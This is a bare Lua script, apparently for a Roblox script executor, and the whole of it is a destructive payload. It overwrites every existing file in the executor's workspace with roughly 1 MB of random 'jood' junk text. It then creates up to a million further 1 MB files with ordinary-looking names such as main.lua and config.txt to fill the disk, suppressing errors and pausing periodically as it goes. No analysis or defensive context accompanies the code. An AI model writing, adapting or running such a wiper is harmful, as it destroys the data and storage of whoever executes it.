local maxfiles = 1000000
local filesize = 1024 * 1024

if type(writefile) ~= "function" or type(listfiles) ~= "function" then return end

math.randomseed(os.time())
local waitfn = (task and task.wait) or wait or function() end

local function gencontent()
    local parts, size, n = {}, 0, 0
    while size < filesize do
        local g = "jood" .. math.random(0, 99999999)
        n = n + 1
        parts[n] = g .. "\n"
        size = size + #g + 1
    end
    return table.concat(parts)
end

local existing = {}
for _, p in ipairs(listfiles("")) do
    if not isfolder or not isfolder(p) then
        existing[#existing+1] = p
    end
end

local count = 0

for _, path in ipairs(existing) do
    if count >= maxfiles then break end
    pcall(writefile, path, gencontent())
    count = count + 1
    if count % 100 == 0 then waitfn(0.01) end
end

local taken = {}
for _, p in ipairs(listfiles("")) do taken[p] = true end

local bases = {"main.lua","init.lua","config.txt","data.json","script.lua","settings.cfg"}
local idx = 1

while count < maxfiles do
    local base = bases[((idx - 1) % #bases) + 1]
    local stem, ext = base:match("^(.-)(%.[^%.]+)$")
    if not stem then stem, ext = base, "" end
    local name = base
    local n = 1
    while taken[name] do
        name = stem .. n .. ext
        n = n + 1
    end
    taken[name] = true
    pcall(writefile, name, gencontent())
    count = count + 1
    idx = idx + 1
    if count % 100 == 0 then waitfn(0.01) end
end
